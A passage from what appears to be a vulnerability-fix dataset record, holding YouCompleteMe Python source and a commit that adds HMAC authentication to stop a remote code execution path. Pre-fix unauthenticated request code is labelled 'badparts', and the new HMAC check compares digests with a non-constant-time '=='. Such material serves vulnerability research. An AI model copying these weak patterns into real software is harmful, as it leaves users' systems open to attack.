+='\\nServer process ID:{0}'.format( self._server_popen.pid) if self._server_stderr or self._server_stdout: debug_info +='\\nServer logfiles:\\n {0}\\n {1}'.format( self._server_stdout, self._server_stderr) return debug_info def CurrentFiletypeCompletionEnabled( self): filetypes=vimsupport.CurrentFiletypes() filetype_to_disable=self._user_options[ 'filetype_specific_completion_to_disable'] return not all([ x in filetype_to_disable for x in filetypes]) def _AddSyntaxDataIfNeeded( self, extra_data): if not self._user_options[ 'seed_identifiers_with_syntax']: return filetype=vimsupport.CurrentFiletypes()[ 0] if filetype in self._filetypes_with_keywords_loaded: return self._filetypes_with_keywords_loaded.add( filetype) extra_data[ 'syntax_keywords']=list( syntax_parse.SyntaxKeywordsForCurrentBuffer()) def _AddTagsFilesIfNeeded( self, extra_data): def GetTagFiles(): tag_files=vim.eval( 'tagfiles()') current_working_directory=os.getcwd() return[ os.path.join( current_working_directory, x) for x in tag_files] if not self._user_options[ 'collect_identifiers_from_tags_files']: return extra_data[ 'tag_files']=GetTagFiles() def _AddExtraConfDataIfNeeded( self, extra_data): def BuildExtraConfData( extra_conf_vim_data): return dict(( expr, vimsupport.VimExpressionToPythonType( expr)) for expr in extra_conf_vim_data) extra_conf_vim_data=self._user_options[ 'extra_conf_vim_data'] if extra_conf_vim_data: extra_data[ 'extra_conf_data']=BuildExtraConfData( extra_conf_vim_data) def _PathToServerScript(): dir_of_current_script=os.path.dirname( os.path.abspath( __file__)) return os.path.join( dir_of_current_script, 'server\/ycmd.py') def _AddUltiSnipsDataIfNeeded( extra_data): if not USE_ULTISNIPS_DATA: return try: rawsnips=UltiSnips_Manager._snips( '', 1) except: return extra_data[ 'ultisnips_snippets']=[{ 'trigger': x.trigger, 'description': x.description } for x in rawsnips] ","sourceWithComments":"#!\/usr\/bin\/env python\n#\n# Copyright (C) 2011, 2012  Google Inc.\n#\n# This file is part of YouCompleteMe.\n#\n# YouCompleteMe is free software: you can redistribute it and\/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# YouCompleteMe is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with YouCompleteMe.  If not, see <http:\/\/www.gnu.org\/licenses\/>.\n\nimport os\nimport vim\nimport tempfile\nimport json\nimport signal\nfrom subprocess import PIPE\nfrom ycm import vimsupport\nfrom ycm import utils\nfrom ycm.diagnostic_interface import DiagnosticInterface\nfrom ycm.completers.all.omni_completer import OmniCompleter\nfrom ycm.completers.general import syntax_parse\nfrom ycm.completers.completer_utils import FiletypeCompleterExistsForFiletype\nfrom ycm.client.ycmd_keepalive import YcmdKeepalive\nfrom ycm.client.base_request import BaseRequest, BuildRequestData\nfrom ycm.client.command_request import SendCommandRequest\nfrom ycm.client.completion_request import CompletionRequest\nfrom ycm.client.omni_completion_request import OmniCompletionRequest\nfrom ycm.client.event_notification import ( SendEventNotificationAsync,\n                                            EventNotification )\nfrom ycm.server.responses import ServerError\n\ntry:\n  from UltiSnips import UltiSnips_Manager\n  USE_ULTISNIPS_DATA = True\nexcept ImportError:\n  USE_ULTISNIPS_DATA = False\n\n# We need this so that Requests doesn't end up using the local HTTP proxy when\n# talking to ycmd. Users should actually be setting this themselves when\n# configuring a proxy server on their machine, but most don't know they need to\n# or how to do it, so we do it for them.\n# Relevant issues:\n#  https:\/\/github.com\/Valloric\/YouCompleteMe\/issues\/641\n#  https:\/\/github.com\/kennethreitz\/requests\/issues\/879\nos.environ['no_proxy'] = '127.0.0.1,localhost'\n\n# Force the Python interpreter embedded in Vim (in which we are running) to\n# ignore the SIGINT signal. This helps reduce the fallout of a user pressing\n# Ctrl-C in Vim.\nsignal.signal( signal.SIGINT, signal.SIG_IGN )\n\nNUM_YCMD_STDERR_LINES_ON_CRASH = 30\nSERVER_CRASH_MESSAGE_STDERR_FILE = (\n  'The ycmd server SHUT DOWN (restart with :YcmRestartServer). ' +\n  'Stderr (last {0} lines):\\n\\n'.format( NUM_YCMD_STDERR_LINES_ON_CRASH ) )\nSERVER_CRASH_MESSAGE_SAME_STDERR = (\n  'The ycmd server SHUT DOWN (restart with :YcmRestartServer). '\n  ' check console output for logs!' )\nSERVER_IDLE_SUICIDE_SECONDS = 10800  # 3 hours\n\n\nclass YouCompleteMe( object ):\n  def __init__( self, user_options ):\n    self._user_options = user_options\n    self._user_notified_about_crash = False\n    self._diag_interface = DiagnosticInterface( user_options )\n    self._omnicomp = OmniCompleter( user_options )\n    self._latest_completion_request = None\n    self._latest_file_parse_request = None\n    self._server_stdout = None\n    self._server_stderr = None\n    self._server_popen = None\n    self._filetypes_with_keywords_loaded = set()\n    self._temp_options_filename = None\n    self._ycmd_keepalive = YcmdKeepalive()\n    self._SetupServer()\n    self._ycmd_keepalive.Start()\n\n  def _SetupServer( self ):\n    server_port = utils.GetUnusedLocalhostPort()\n    with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n      self._temp_options_filename = options_file.name\n      json.dump( dict( self._user_options ), options_file )\n      options_file.flush()\n\n      args = [ utils.PathToPythonInterpreter(),\n               _PathToServerScript(),\n               '--port={0}'.format( server_port ),\n               '--options_file={0}'.format( options_file.name ),\n               '--log={0}'.format( self._user_options[ 'server_log_level' ] ),\n               '--idle_suicide_seconds={0}'.format(\n                  SERVER_IDLE_SUICIDE_SECONDS )]\n\n      if not self._user_options[ 'server_use_vim_stdout' ]:\n        filename_format = os.path.join( utils.PathToTempDir(),\n                                        'server_{port}_{std}.log' )\n\n        self._server_stdout = filename_format.format( port = server_port,\n                                                      std = 'stdout' )\n        self._server_stderr = filename_format.format( port = server_port,\n                                                      std = 'stderr' )\n        args.append('--stdout={0}'.format( self._server_stdout ))\n        args.append('--stderr={0}'.format( self._server_stderr ))\n\n        if self._user_options[ 'server_keep_logfiles' ]:\n          args.append('--keep_logfiles')\n\n      self._server_popen = utils.SafePopen( args, stdout = PIPE, stderr = PIPE)\n      BaseRequest.server_location = 'http:\/\/localhost:' + str( server_port )\n\n    self._NotifyUserIfServerCrashed()\n\n  def _IsServerAlive( self ):\n    returncode = self._server_popen.poll()\n    # When the process hasn't finished yet, poll() returns None.\n    return returncode is None\n\n\n  def _NotifyUserIfServerCrashed( self ):\n    if self._user_notified_about_crash or self._IsServerAlive():\n      return\n    self._user_notified_about_crash = True\n    if self._server_stderr:\n      with open( self._server_stderr, 'r' ) as server_stderr_file:\n        error_output = ''.join( server_stderr_file.readlines()[\n            : - NUM_YCMD_STDERR_LINES_ON_CRASH ] )\n        vimsupport.PostMultiLineNotice( SERVER_CRASH_MESSAGE_STDERR_FILE +\n                                        error_output )\n    else:\n        vimsupport.PostVimMessage( SERVER_CRASH_MESSAGE_SAME_STDERR )\n\n\n  def ServerPid( self ):\n    if not self._server_popen:\n      return -1\n    return self._server_popen.pid\n\n\n  def _ServerCleanup( self ):\n    if self._IsServerAlive():\n      self._server_popen.terminate()\n    utils.RemoveIfExists( self._temp_options_filename )\n\n\n  def RestartServer( self ):\n    vimsupport.PostVimMessage( 'Restarting ycmd server...' )\n    self._user_notified_about_crash = False\n    self._ServerCleanup()\n    self._SetupServer()\n\n\n  def CreateCompletionRequest( self, force_semantic = False ):\n    # We have to store a reference to the newly created CompletionRequest\n    # because VimScript can't store a reference to a Python object across\n    # function calls... Thus we need to keep this request somewhere.\n    if ( not self.NativeFiletypeCompletionAvailable() and\n         self.CurrentFiletypeCompletionEnabled() and\n         self._omnicomp.ShouldUseNow() ):\n      self._latest_completion_request = OmniCompletionRequest( self._omnicomp )\n    else:\n      extra_data = {}\n      self._AddExtraConfDataIfNeeded( extra_data )\n      if force_semantic:\n        extra_data[ 'force_semantic' ] = True\n\n      self._latest_completion_request = ( CompletionRequest( extra_data )\n                                          if self._IsServerAlive() else\n                                          None )\n    return self._latest_completion_request\n\n\n  def SendCommandRequest( self, arguments, completer ):\n    if self._IsServerAlive():\n      return SendCommandRequest( arguments, completer )\n\n\n  def GetDefinedSubcommands( self ):\n    if self._IsServerAlive():\n      return BaseRequest.PostDataToHandler( BuildRequestData(),\n                                            'defined_subcommands' )\n    else:\n      return []\n\n\n  def GetCurrentCompletionRequest( self ):\n    return self._latest_completion_request\n\n\n  def GetOmniCompleter( self ):\n    return self._omnicomp\n\n\n  def NativeFiletypeCompletionAvailable( self ):\n    return any( [ FiletypeCompleterExistsForFiletype( x ) for x in\n                  vimsupport.CurrentFiletypes() ] )\n\n\n  def NativeFiletypeCompletionUsable( self ):\n    return ( self.CurrentFiletypeCompletionEnabled() and\n             self.NativeFiletypeCompletionAvailable() )\n\n\n  def OnFileReadyToParse( self ):\n    self._omnicomp.OnFileReadyToParse( None )\n\n    if not self._IsServerAlive():\n      self._NotifyUserIfServerCrashed()\n\n    extra_data = {}\n    self._AddTagsFilesIfNeeded( extra_data )\n    self._AddSyntaxDataIfNeeded( extra_data )\n    self._AddExtraConfDataIfNeeded( extra_data )\n\n    self._latest_file_parse_request = EventNotification( 'FileReadyToParse',\n                                                          extra_data )\n    self._latest_file_parse_request.Start()\n\n\n  def OnBufferUnload( self, deleted_buffer_file ):\n    if not self._IsServerAlive():\n      return\n    SendEventNotificationAsync( 'BufferUnload',\n                                { 'unloaded_buffer': deleted_buffer_file } )\n\n\n  def OnBufferVisit( self ):\n    if not self._IsServerAlive():\n      return\n    extra_data = {}\n    _AddUltiSnipsDataIfNeeded( extra_data )\n    SendEventNotificationAsync( 'BufferVisit', extra_data )\n\n\n  def OnInsertLeave( self ):\n    if not self._IsServerAlive():\n      return\n    SendEventNotificationAsync( 'InsertLeave' )\n\n\n  def OnCursorMoved( self ):\n    self._diag_interface.OnCursorMoved()\n\n\n  def OnVimLeave( self ):\n    self._ServerCleanup()\n\n\n  def OnCurrentIdentifierFinished( self ):\n    if not self._IsServerAlive():\n      return\n    SendEventNotificationAsync( 'CurrentIdentifierFinished' )\n\n\n  def DiagnosticsForCurrentFileReady( self ):\n    return bool( self._latest_file_parse_request and\n                 self._latest_file_parse_request.Done() )\n\n\n  def GetDiagnosticsFromStoredRequest( self, qflist_format = False ):\n    if self.DiagnosticsForCurrentFileReady():\n      diagnostics = self._latest_file_parse_request.Response()\n      # We set the diagnostics request to None because we want to prevent\n      # Syntastic from repeatedly refreshing the buffer with the same diags.\n      # Setting this to None makes DiagnosticsForCurrentFileReady return False\n      # until the next request is created.\n      self._latest_file_parse_request = None\n      if qflist_format:\n        return vimsupport.ConvertDiagnosticsToQfList( diagnostics )\n      else:\n        return diagnostics\n    return []\n\n\n  def UpdateDiagnosticInterface( self ):\n    if not self.DiagnosticsForCurrentFileReady():\n      return\n    self._diag_interface.UpdateWithNewDiagnostics(\n      self.GetDiagnosticsFromStoredRequest() )\n\n\n  def ShowDetailedDiagnostic( self ):\n    if not self._IsServerAlive():\n      return\n    try:\n      debug_info = BaseRequest.PostDataToHandler( BuildRequestData(),\n                                                  'detailed_diagnostic' )\n      if 'message' in debug_info:\n        vimsupport.EchoText( debug_info[ 'message' ] )\n    except ServerError as e:\n      vimsupport.PostVimMessage( str( e ) )\n\n\n  def DebugInfo( self ):\n    if self._IsServerAlive():\n      debug_info = BaseRequest.PostDataToHandler( BuildRequestData(),\n                                                  'debug_info' )\n    else:\n      debug_info = 'Server crashed, no debug info from server'\n    debug_info += '\\nServer running at: {0}'.format(\n        BaseRequest.server_location )\n    debug_info += '\\nServer process ID: {0}'.format( self._server_popen.pid )\n    if self._server_stderr or self._server_stdout:\n      debug_info += '\\nServer logfiles:\\n  {0}\\n  {1}'.format(\n        self._server_stdout,\n        self._server_stderr )\n\n    return debug_info\n\n\n  def CurrentFiletypeCompletionEnabled( self ):\n    filetypes = vimsupport.CurrentFiletypes()\n    filetype_to_disable = self._user_options[\n      'filetype_specific_completion_to_disable' ]\n    return not all([ x in filetype_to_disable for x in filetypes ])\n\n\n  def _AddSyntaxDataIfNeeded( self, extra_data ):\n    if not self._user_options[ 'seed_identifiers_with_syntax' ]:\n      return\n    filetype = vimsupport.CurrentFiletypes()[ 0 ]\n    if filetype in self._filetypes_with_keywords_loaded:\n      return\n\n    self._filetypes_with_keywords_loaded.add( filetype )\n    extra_data[ 'syntax_keywords' ] = list(\n       syntax_parse.SyntaxKeywordsForCurrentBuffer() )\n\n\n  def _AddTagsFilesIfNeeded( self, extra_data ):\n    def GetTagFiles():\n      tag_files = vim.eval( 'tagfiles()' )\n      current_working_directory = os.getcwd()\n      return [ os.path.join( current_working_directory, x ) for x in tag_files ]\n\n    if not self._user_options[ 'collect_identifiers_from_tags_files' ]:\n      return\n    extra_data[ 'tag_files' ] = GetTagFiles()\n\n\n  def _AddExtraConfDataIfNeeded( self, extra_data ):\n    def BuildExtraConfData( extra_conf_vim_data ):\n      return dict( ( expr, vimsupport.VimExpressionToPythonType( expr ) )\n                   for expr in extra_conf_vim_data )\n\n    extra_conf_vim_data = self._user_options[ 'extra_conf_vim_data' ]\n    if extra_conf_vim_data:\n      extra_data[ 'extra_conf_data' ] = BuildExtraConfData(\n        extra_conf_vim_data )\n\n\ndef _PathToServerScript():\n  dir_of_current_script = os.path.dirname( os.path.abspath( __file__ ) )\n  return os.path.join( dir_of_current_script, 'server\/ycmd.py' )\n\n\ndef _AddUltiSnipsDataIfNeeded( extra_data ):\n  if not USE_ULTISNIPS_DATA:\n    return\n\n  try:\n    rawsnips = UltiSnips_Manager._snips( '', 1 )\n  except:\n    return\n\n  # UltiSnips_Manager._snips() returns a class instance where:\n  # class.trigger - name of snippet trigger word ( e.g. defn or testcase )\n  # class.description - description of the snippet\n  extra_data[ 'ultisnips_snippets' ] = [ { 'trigger': x.trigger,\n                                           'description': x.description\n                                         } for x in rawsnips ]\n\n\n"}},"msg":"Client\/server communication now uses HMAC for auth\n\nThis is to prevent a convoluted exploit that can trigger remote code execution."}},"https:\/\/github.com\/nikola-tes\/fork":{"e965e0284789e610c0a50d20a92a82ec5c135064":{"url":"https:\/\/api.github.com\/repos\/nikola-tes\/fork\/commits\/e965e0284789e610c0a50d20a92a82ec5c135064","html_url":"https:\/\/github.com\/nikola-tes\/fork\/commit\/e965e0284789e610c0a50d20a92a82ec5c135064","message":"Client\/server communication now uses HMAC for auth\n\nThis is to prevent a convoluted exploit that can trigger remote code execution.","sha":"e965e0284789e610c0a50d20a92a82ec5c135064","keyword":"remote code execution prevent","diff":"diff --git a\/python\/ycm\/client\/base_request.py b\/python\/ycm\/client\/base_request.py\nindex 7f609727..c9c417f4 100644\n--- a\/python\/ycm\/client\/base_request.py\n+++ b\/python\/ycm\/client\/base_request.py\n@@ -24,6 +24,7 @@\n from requests_futures.sessions import FuturesSession\n from ycm.unsafe_thread_pool_executor import UnsafeThreadPoolExecutor\n from ycm import vimsupport\n+from ycm import utils\n from ycm.utils import ToUtf8Json\n from ycm.server.responses import ServerError, UnknownExtraConf\n \n@@ -31,6 +32,7 @@\n _EXECUTOR = UnsafeThreadPoolExecutor( max_workers = 30 )\n # Setting this to None seems to screw up the Requests\/urllib3 libs.\n _DEFAULT_TIMEOUT_SEC = 30\n+_HMAC_HEADER = 'x-ycm-hmac'\n \n class BaseRequest( object ):\n   def __init__( self ):\n@@ -88,24 +90,28 @@ def _TalkToHandlerAsync( data,\n                            timeout = _DEFAULT_TIMEOUT_SEC ):\n     def SendRequest( data, handler, method, timeout ):\n       if method == 'POST':\n-        return BaseRequest.session.post( _BuildUri( handler ),\n-                                        data = ToUtf8Json( data ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        sent_data = ToUtf8Json( data )\n+        return BaseRequest.session.post(\n+            _BuildUri( handler ),\n+            data = sent_data,\n+            headers = BaseRequest._ExtraHeaders( sent_data ),\n+            timeout = timeout )\n       if method == 'GET':\n-        return BaseRequest.session.get( _BuildUri( handler ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        return BaseRequest.session.get(\n+            _BuildUri( handler ),\n+            headers = BaseRequest._ExtraHeaders(),\n+            timeout = timeout )\n \n     @retries( 5, delay = 0.5, backoff = 1.5 )\n     def DelayedSendRequest( data, handler, method ):\n       if method == 'POST':\n+        sent_data = ToUtf8Json( data )\n         return requests.post( _BuildUri( handler ),\n-                              data = ToUtf8Json( data ),\n-                              headers = _HEADERS )\n+                              data = sent_data,\n+                              headers = BaseRequest._ExtraHeaders( sent_data ) )\n       if method == 'GET':\n         return requests.get( _BuildUri( handler ),\n-                             headers = _HEADERS )\n+                             headers = BaseRequest._ExtraHeaders() )\n \n     if not _CheckServerIsHealthyWithCache():\n       return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n@@ -113,8 +119,18 @@ def DelayedSendRequest( data, handler, method ):\n     return SendRequest( data, handler, method, timeout )\n \n \n+  @staticmethod\n+  def _ExtraHeaders( request_body = None ):\n+    if not request_body:\n+      request_body = ''\n+    headers = dict( _HEADERS )\n+    headers[ _HMAC_HEADER ] = utils.CreateHexHmac( request_body,\n+                                                   BaseRequest.hmac_secret )\n+    return headers\n+\n   session = FuturesSession( executor = _EXECUTOR )\n   server_location = 'http:\/\/localhost:6666'\n+  hmac_secret = ''\n \n \n def BuildRequestData( start_column = None,\n@@ -141,6 +157,7 @@ def BuildRequestData( start_column = None,\n \n def JsonFromFuture( future ):\n   response = future.result()\n+  _ValidateResponseObject( response )\n   if response.status_code == requests.codes.server_error:\n     _RaiseExceptionForData( response.json() )\n \n@@ -153,6 +170,13 @@ def JsonFromFuture( future ):\n   return None\n \n \n+def _ValidateResponseObject( response ):\n+  if not utils.ContentHexHmacValid( response.content,\n+                                    response.headers[ _HMAC_HEADER ],\n+                                    BaseRequest.hmac_secret ):\n+    raise RuntimeError( 'Received invalid HMAC for response!' )\n+  return True\n+\n def _BuildUri( handler ):\n   return urlparse.urljoin( BaseRequest.server_location, handler )\n \n@@ -163,7 +187,9 @@ def _CheckServerIsHealthyWithCache():\n   global SERVER_HEALTHY\n \n   def _ServerIsHealthy():\n-    response = requests.get( _BuildUri( 'healthy' ) )\n+    response = requests.get( _BuildUri( 'healthy' ),\n+                             headers = BaseRequest._ExtraHeaders() )\n+    _ValidateResponseObject( response )\n     response.raise_for_status()\n     return response.json()\n \ndiff --git a\/python\/ycm\/server\/hmac_plugin.py b\/python\/ycm\/server\/hmac_plugin.py\nnew file mode 100644\nindex 00000000..b433b2b0\n--- \/dev\/null\n+++ b\/python\/ycm\/server\/hmac_plugin.py\n@@ -0,0 +1,57 @@\n+#!\/usr\/bin\/env python\n+#\n+# Copyright (C) 2014  Google Inc.\n+#\n+# This file is part of YouCompleteMe.\n+#\n+# YouCompleteMe is free software: you can redistribute it and\/or modify\n+# it under the terms of the GNU General Public License as published by\n+# the Free Software Foundation, either version 3 of the License, or\n+# (at your option) any later version.\n+#\n+# YouCompleteMe is distributed in the hope that it will be useful,\n+# but WITHOUT ANY WARRANTY; without even the implied warranty of\n+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n+# GNU General Public License for more details.\n+#\n+# You should have received a copy of the GNU General Public License\n+# along with YouCompleteMe.  If not, see <http:\/\/www.gnu.org\/licenses\/>.\n+\n+import logging\n+import httplib\n+from bottle import request, response, abort\n+from ycm import utils\n+\n+_HMAC_HEADER = 'x-ycm-hmac'\n+\n+# This class implements the Bottle plugin API:\n+# http:\/\/bottlepy.org\/docs\/dev\/plugindev.html\n+#\n+# We want to ensure that every request coming in has a valid HMAC set in the\n+# x-ycm-hmac header and that every response coming out sets such a valid header.\n+# This is to prevent security issues with possible remote code execution.\n+class HmacPlugin( object ):\n+  name = 'hmac'\n+  api = 2\n+\n+\n+  def __init__( self, hmac_secret ):\n+    self._hmac_secret = hmac_secret\n+    self._logger = logging.getLogger( __name__ )\n+\n+\n+  def __call__( self, callback ):\n+    def wrapper( *args, **kwargs ):\n+      body = request.body.read()\n+      if not utils.ContentHexHmacValid( body,\n+                                        request.headers[ _HMAC_HEADER ],\n+                                        self._hmac_secret ):\n+        self._logger.info( 'Dropping request with bad HMAC.' )\n+        abort( httplib.UNAUTHORIZED, 'Unauthorized, received bad HMAC.')\n+        return\n+      body = callback( *args, **kwargs )\n+      response.headers[ _HMAC_HEADER ] = utils.CreateHexHmac(\n+          body, self._hmac_secret )\n+      return body\n+    return wrapper\n+\ndiff --git a\/python\/ycm\/server\/ycmd.py b\/python\/ycm\/server\/ycmd.py\nindex 34e66172..64b0f07f 100755\n--- a\/python\/ycm\/server\/ycmd.py\n+++ b\/python\/ycm\/server\/ycmd.py\n@@ -27,10 +27,12 @@\n import waitress\n import signal\n import os\n+import base64\n from ycm import user_options_store\n from ycm import extra_conf_store\n from ycm import utils\n from ycm.server.watchdog_plugin import WatchdogPlugin\n+from ycm.server.hmac_plugin import HmacPlugin\n \n def YcmCoreSanityCheck():\n   if 'ycm_core' in sys.modules:\n@@ -103,6 +105,8 @@ def Main():\n   options = ( json.load( open( args.options_file, 'r' ) )\n               if args.options_file\n               else user_options_store.DefaultOptions() )\n+  utils.RemoveIfExists( args.options_file )\n+  hmac_secret = base64.b64decode( options[ 'hmac_secret' ] )\n   user_options_store.SetAll( options )\n \n   # This ensures that ycm_core is not loaded before extra conf\n@@ -126,6 +130,7 @@ def Main():\n   handlers.UpdateUserOptions( options )\n   SetUpSignalHandler(args.stdout, args.stderr, args.keep_logfiles)\n   handlers.app.install( WatchdogPlugin( args.idle_suicide_seconds ) )\n+  handlers.app.install( HmacPlugin( hmac_secret ) )\n   waitress.serve( handlers.app,\n                   host = args.host,\n                   port = args.port,\ndiff --git a\/python\/ycm\/utils.py b\/python\/ycm\/utils.py\nindex d9128716..095337c9 100644\n--- a\/python\/ycm\/utils.py\n+++ b\/python\/ycm\/utils.py\n@@ -25,6 +25,8 @@\n import socket\n import stat\n import json\n+import hmac\n+import hashlib\n from distutils.spawn import find_executable\n import subprocess\n import collections\n@@ -212,3 +214,11 @@ def SafePopen( *args, **kwargs ):\n   return subprocess.Popen( *args, **kwargs )\n \n \n+def ContentHexHmacValid( content, hmac, hmac_secret ):\n+  return hmac == CreateHexHmac( content, hmac_secret )\n+\n+\n+def CreateHexHmac( content, hmac_secret ):\n+  return hmac.new( hmac_secret,\n+                   msg = content,\n+                   digestmod = hashlib.sha256 ).hexdigest()\ndiff --git a\/python\/ycm\/youcompleteme.py b\/python\/ycm\/youcompleteme.py\nindex 448236eb..83849ce1 100644\n--- a\/python\/ycm\/youcompleteme.py\n+++ b\/python\/ycm\/youcompleteme.py\n@@ -22,6 +22,7 @@\n import tempfile\n import json\n import signal\n+import base64\n from subprocess import PIPE\n from ycm import vimsupport\n from ycm import utils\n@@ -58,6 +59,7 @@\n # Ctrl-C in Vim.\n signal.signal( signal.SIGINT, signal.SIG_IGN )\n \n+HMAC_SECRET_LENGTH = 16\n NUM_YCMD_STDERR_LINES_ON_CRASH = 30\n SERVER_CRASH_MESSAGE_STDERR_FILE = (\n   'The ycmd server SHUT DOWN (restart with :YcmRestartServer). ' +\n@@ -80,16 +82,18 @@ def __init__( self, user_options ):\n     self._server_stderr = None\n     self._server_popen = None\n     self._filetypes_with_keywords_loaded = set()\n-    self._temp_options_filename = None\n     self._ycmd_keepalive = YcmdKeepalive()\n     self._SetupServer()\n     self._ycmd_keepalive.Start()\n \n   def _SetupServer( self ):\n     server_port = utils.GetUnusedLocalhostPort()\n+    # The temp options file is deleted by ycmd during startup\n     with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n-      self._temp_options_filename = options_file.name\n-      json.dump( dict( self._user_options ), options_file )\n+      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )\n+      options_dict = dict( self._user_options )\n+      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )\n+      json.dump( options_dict, options_file )\n       options_file.flush()\n \n       args = [ utils.PathToPythonInterpreter(),\n@@ -116,6 +120,7 @@ def _SetupServer( self ):\n \n       self._server_popen = utils.SafePopen( args, stdout = PIPE, stderr = PIPE)\n       BaseRequest.server_location = 'http:\/\/localhost:' + str( server_port )\n+      BaseRequest.hmac_secret = hmac_secret\n \n     self._NotifyUserIfServerCrashed()\n \n@@ -148,7 +153,6 @@ def ServerPid( self ):\n   def _ServerCleanup( self ):\n     if self._IsServerAlive():\n       self._server_popen.terminate()\n-    utils.RemoveIfExists( self._temp_options_filename )\n \n \n   def RestartServer( self ):\n","files":{"\/python\/ycm\/client\/base_request.py":{"changes":[{"diff":"\n                            timeout = _DEFAULT_TIMEOUT_SEC ):\n     def SendRequest( data, handler, method, timeout ):\n       if method == 'POST':\n-        return BaseRequest.session.post( _BuildUri( handler ),\n-                                        data = ToUtf8Json( data ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        sent_data = ToUtf8Json( data )\n+        return BaseRequest.session.post(\n+            _BuildUri( handler ),\n+            data = sent_data,\n+            headers = BaseRequest._ExtraHeaders( sent_data ),\n+            timeout = timeout )\n       if method == 'GET':\n-        return BaseRequest.session.get( _BuildUri( handler ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        return BaseRequest.session.get(\n+            _BuildUri( handler ),\n+            headers = BaseRequest._ExtraHeaders(),\n+            timeout = timeout )\n \n     @retries( 5, delay = 0.5, backoff = 1.5 )\n     def DelayedSendRequest( data, handler, method ):\n       if method == 'POST':\n+        sent_data = ToUtf8Json( data )\n         return requests.post( _BuildUri( handler ),\n-                              data = ToUtf8Json( data ),\n-                              headers = _HEADERS )\n+                              data = sent_data,\n+                              headers = BaseRequest._ExtraHeaders( sent_data ) )\n       if method == 'GET':\n         return requests.get( _BuildUri( handler ),\n-                             headers = _HEADERS )\n+                             headers = BaseRequest._ExtraHeaders() )\n \n     if not _CheckServerIsHealthyWithCache():\n       return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n","add":14,"remove":10,"filename":"\/python\/ycm\/client\/base_request.py","badparts":["        return BaseRequest.session.post( _BuildUri( handler ),","                                        data = ToUtf8Json( data ),","                                        headers = _HEADERS,","                                        timeout = timeout )","        return BaseRequest.session.get( _BuildUri( handler ),","                                        headers = _HEADERS,","                                        timeout = timeout )","                              data = ToUtf8Json( data ),","                              headers = _HEADERS )","                             headers = _HEADERS )"],"goodparts":["        sent_data = ToUtf8Json( data )","        return BaseRequest.session.post(","            _BuildUri( handler ),","            data = sent_data,","            headers = BaseRequest._ExtraHeaders( sent_data ),","            timeout = timeout )","        return BaseRequest.session.get(","            _BuildUri( handler ),","            headers = BaseRequest._ExtraHeaders(),","            timeout = timeout )","        sent_data = ToUtf8Json( data )","                              data = sent_data,","                              headers = BaseRequest._ExtraHeaders( sent_data ) )","                             headers = BaseRequest._ExtraHeaders() )"]},{"diff":"\n   global SERVER_HEALTHY\n \n   def _ServerIsHealthy():\n-    response = requests.get( _BuildUri( 'healthy' ) )\n+    response = requests.get( _BuildUri( 'healthy' ),\n+                             headers = BaseRequest._ExtraHeaders() )\n+    _ValidateResponseObject( response )\n     response.raise_for_status()\n     return response.json()\n ","add":3,"remove":1,"filename":"\/python\/ycm\/client\/base_request.py","badparts":["    response = requests.get( _BuildUri( 'healthy' ) )"],"goodparts":["    response = requests.get( _BuildUri( 'healthy' ),","                             headers = BaseRequest._ExtraHeaders() )","    _ValidateResponseObject( response )"]},{"diff":"\n                            timeout = _DEFAULT_TIMEOUT_SEC ):\n     def SendRequest( data, handler, method, timeout ):\n       if method == 'POST':\n-        return BaseRequest.session.post( _BuildUri( handler ),\n-                                        data = ToUtf8Json( data ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        sent_data = ToUtf8Json( data )\n+        return BaseRequest.session.post(\n+            _BuildUri( handler ),\n+            data = sent_data,\n+            headers = BaseRequest._ExtraHeaders( sent_data ),\n+            timeout = timeout )\n       if method == 'GET':\n-        return BaseRequest.session.get( _BuildUri( handler ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        return BaseRequest.session.get(\n+            _BuildUri( handler ),\n+            headers = BaseRequest._ExtraHeaders(),\n+            timeout = timeout )\n \n     @retries( 5, delay = 0.5, backoff = 1.5 )\n     def DelayedSendRequest( data, handler, method ):\n       if method == 'POST':\n+        sent_data = ToUtf8Json( data )\n         return requests.post( _BuildUri( handler ),\n-                              data = ToUtf8Json( data ),\n-                              headers = _HEADERS )\n+                              data = sent_data,\n+                              headers = BaseRequest._ExtraHeaders( sent_data ) )\n       if method == 'GET':\n         return requests.get( _BuildUri( handler ),\n-                             headers = _HEADERS )\n+                             headers = BaseRequest._ExtraHeaders() )\n \n     if not _CheckServerIsHealthyWithCache():\n       return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n","add":14,"remove":10,"filename":"\/python\/ycm\/client\/base_request.py","badparts":["        return BaseRequest.session.post( _BuildUri( handler ),","                                        data = ToUtf8Json( data ),","                                        headers = _HEADERS,","                                        timeout = timeout )","        return BaseRequest.session.get( _BuildUri( handler ),","                                        headers = _HEADERS,","                                        timeout = timeout )","                              data = ToUtf8Json( data ),","                              headers = _HEADERS )","                             headers = _HEADERS )"],"goodparts":["        sent_data = ToUtf8Json( data )","        return BaseRequest.session.post(","            _BuildUri( handler ),","            data = sent_data,","            headers = BaseRequest._ExtraHeaders( sent_data ),","            timeout = timeout )","        return BaseRequest.session.get(","            _BuildUri( handler ),","            headers = BaseRequest._ExtraHeaders(),","            timeout = timeout )","        sent_data = ToUtf8Json( data )","                              data = sent_data,","                              headers = BaseRequest._ExtraHeaders( sent_data ) )","                             headers = BaseRequest._ExtraHeaders() )"]},{"diff":"\n   global SERVER_HEALTHY\n \n   def _ServerIsHealthy():\n-    response = requests.get( _BuildUri( 'healthy' ) )\n+    response = requests.get( _BuildUri( 'healthy' 